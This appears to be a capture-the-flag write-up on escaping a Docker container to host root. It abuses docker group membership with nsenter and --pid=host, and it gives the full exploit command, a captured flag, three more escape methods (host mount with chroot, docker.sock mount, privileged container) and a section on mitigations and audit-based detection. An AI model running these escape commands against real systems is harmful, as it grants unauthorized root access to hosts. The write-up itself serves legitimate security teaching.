# Docker Privilege Escalation via nsenter

## 🎓 Understanding the Attack

### What Are Linux Namespaces?

Linux containers work by creating **isolated namespaces** for processes:

```
┌─────────────────────────────────────┐
│         HOST SYSTEM                  │
│  PID 1: systemd (init)              │
│  PID 100: sshd                       │
│  PID 200: docker daemon              │
│                                      │
│  ┌────────────────────────┐         │
│  │  CONTAINER (isolated)   │         │
│  │  PID 1: /bin/sh        │         │
│  │  PID 2: sleep          │         │
│  │  (can't see host PIDs) │         │
│  └────────────────────────┘         │
└─────────────────────────────────────┘
```

**Types of Namespaces:**
- **PID**: Process IDs (containers see own processes only)
- **Mount**: Filesystem mounts
- **Network**: Network interfaces, routing
- **UTS**: Hostname
- **IPC**: Inter-process communication
- **User**: User and group IDs

### The Vulnerability: Shared PID Namespace

Docker allows containers to **share the host's PID namespace** with `--pid=host`:

```bash
docker run --pid=host alpine
```

```
┌─────────────────────────────────────┐
│         HOST SYSTEM                  │
│  PID 1: systemd                      │
│  PID 100: sshd                       │
│                                      │
│  ┌────────────────────────┐         │
│  │  CONTAINER             │         │
│  │  Can see PID 1!        │         │
│  │  Can see PID 100!      │         │
│  │  (sees ALL host PIDs)  │         │
│  └────────────────────────┘         │
└─────────────────────────────────────┘
```

### Enter nsenter: The Magic Tool

**nsenter** = "**N**ame**s**pace **Enter**"

It allows you to **enter another process's namespaces**:

```bash
nsenter --target 1 --mount --uts --ipc --net /bin/sh
```

**Translation:**
- `--target 1`: Target PID 1 (systemd/init on host)
- `--mount`: Enter its mount namespace (host filesystem)
- `--uts`: Enter its UTS namespace (host hostname)
- `--ipc`: Enter its IPC namespace
- `--net`: Enter its network namespace
- `/bin/sh`: Give me a shell

**Result**: You're now executing in the **host's context**, not the container! 🎉

---

## 🎯 The Complete Attack

### Step 1: Confirm Docker Group Access

```bash
id
# Output: uid=1000(abu) gid=1000(abu) groups=1000(abu),999(docker)

groups
# Output: abu docker
```

### Step 2: List Available Images

```bash
docker images
```

Expected output:
```
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    xxx            2 weeks ago   7.73MB
busybox      latest    xxx            2 weeks ago   4.26MB
ubuntu       latest    xxx            2 weeks ago   77.8MB
```

### Step 3: The Exploit Command

```bash
docker run --rm -it --pid=host --cap-add=SYS_ADMIN alpine \
  nsenter --target 1 --mount --uts --ipc --net /bin/sh
```

**Breakdown:**
- `docker run`: Create and run container
- `--rm`: Remove container after exit
- `-it`: Interactive terminal
- `--pid=host`: **Share host's PID namespace** 🔑
- `--cap-add=SYS_ADMIN`: **Add capability for namespace operations** 🔑
- `alpine`: Lightweight image with nsenter
- `nsenter ...`: Enter host's namespaces

### Step 4: Verify Root Access

```bash
whoami
# root

hostname
# mobydock (host's hostname!)

cat /root/flag3.txt
# H7CTF{d0ck3r_esc4p3_v1a_n4m3sp4c3_sh4r1ng_and_nsent3r}
```

---

## 🔍 Why This Works

### 1. Docker Group = Root Equivalent

Being in the `docker` group means you can:
- Run containers
- Mount volumes
- Set capabilities
- Share namespaces

**This is effectively root access!**

### 2. Shared PID Namespace

`--pid=host` breaks container isolation:
- Container can see all host processes
- Container can interact with PID 1 (init/systemd)

### 3. CAP_SYS_ADMIN Capability

This capability allows:
- Mounting filesystems
- Entering namespaces
- Administrative operations

### 4. nsenter Magic

nsenter lets you:
- "Jump" from container to host context
- Access host filesystem
- Run commands as host root

---

## 🛡️ Other Docker Escape Methods

### Method 2: Mount Host Filesystem

```bash
docker run -v /:/hostfs --rm -it alpine chroot /hostfs bash
```

**Simpler but more obvious!**

### Method 3: Socket Mount + Nested Container

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it docker
# Inside container, spawn another privileged container
docker run -v /:/hostfs --rm -it alpine chroot /hostfs bash
```

### Method 4: Privileged Container

```bash
docker run --privileged --rm -it alpine
# Inside, mount host filesystem
mkdir /host
mount /dev/sda1 /host
chroot /host
```

---

## 📚 Learning Resources

### Understanding Namespaces

```bash
# List your current namespaces
ls -la /proc/$$/ns/

# See what namespaces a process is in
ls -la /proc/1/ns/

# Compare container vs host
docker run alpine ls -la /proc/1/ns/
ls -la /proc/1/ns/
```

### Practice Commands

```bash
# Create container with host PID namespace
docker run --pid=host alpine ps aux

# See host processes from container!
docker run --pid=host alpine kill -0 1

# List all namespaces
lsns
```

---

## 🔐 Defense & Mitigation

### How to Prevent This

1. **Don't add users to docker group**
   - Use rootless Docker instead
   - Use sudo with specific docker commands only

2. **Restrict container capabilities**
   ```bash
   docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE app
   ```

3. **Use AppArmor/SELinux profiles**
   ```bash
   docker run --security-opt apparmor=docker-default app
   ```

4. **Disable dangerous flags**
   - Never allow `--privileged`
   - Never allow `--pid=host`
   - Never allow `--cap-add=SYS_ADMIN`

5. **Use Docker authorization plugins**
   - Enforce security policies
   - Block dangerous operations

### Detection

Monitor for:
```bash
# Check audit logs
ausearch -k docker

# Monitor for nsenter usage
auditctl -w /usr/bin/nsenter -p x -k docker_escape

# Check for containers with host PID
docker ps --filter "pid=host"
```

---

## 🎯 Challenge Solution

### Full Exploit Chain

```bash
# 1. Enumerate access
id
groups  # Notice 'docker' group

# 2. Check Docker
docker ps
docker images

# 3. Research privilege escalation
# Find information about nsenter technique

# 4. Execute exploit
docker run --rm -it --pid=host --cap-add=SYS_ADMIN alpine \
  nsenter --target 1 --mount --uts --ipc --net /bin/sh

# 5. Get flag
cat /root/flag3.txt
```

---

## 🤔 Common Issues

### Error: Permission Denied
```bash
# Make sure you're in docker group
groups

# If not, re-login to apply group changes
exit
# SSH back in
```

### Error: Cannot connect to Docker daemon
```bash
# Check if Docker is running
systemctl status docker

# Check socket permissions
ls -la /var/run/docker.sock
```

### Container exits immediately
```bash
# Add -it flags for interactive
docker run --rm -it alpine /bin/sh

# Or use a long-running command
docker run --rm alpine sleep 3600
```

---

## 📖 References

- [Linux Namespaces man page](https://man7.org/linux/man-pages/man7/namespaces.7.html)
- [nsenter man page](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Understanding Docker Container Escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

---

**Remember**: Docker group membership = root equivalent. Treat it with the same caution!
